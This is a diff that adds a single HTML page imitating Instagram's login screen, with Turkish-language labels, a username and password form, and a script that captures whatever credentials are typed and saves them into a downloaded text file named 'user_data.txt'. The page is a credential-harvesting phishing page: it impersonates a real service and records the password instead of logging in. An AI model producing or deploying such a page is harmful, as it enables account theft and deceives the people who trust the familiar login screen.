@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+        }
+        .container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #333;
+            background-color: #111;
+            color: #fff;
+        }
+        .container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .container .forgot-password {
+            color: #0095f6;
+            text-decoration: none;
+            margin: 10px 0;
+            display: block;
+        }
+        .container .separator {
+            color: #aaa;
+            margin: 20px 0;
+        }
+        .container .signup {
+            color: #0095f6;
+            text-decoration: none;
+        }
+        .container .signup-text {
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="instagram-logo.png" alt="Instagram" width="200">
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+            <input type="password" id="password" placeholder="Şifre" required>
+            <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
+            <button type="submit">Giriş Yap</button>
+        </form>
+        <div class="separator">YA DA</div>
+        <div class="signup-text">Hesabın yok mu? <a href="#" class="signup">Kaydol</a></div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const data = `Username: ${username}\nPassword: ${password}\n`;
+
+            // Create a blob with the data
+            const blob = new Blob([data], { type: 'text/plain' });
+
+            // Create a link element
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'user_data.txt';
+
+            // Programmatically click the link to trigger the download
+            a.click();
+
+            // Clean up the URL object
+            URL.revokeObjectURL(a.href);
+        });
+    </script>
+</body>
+</html>
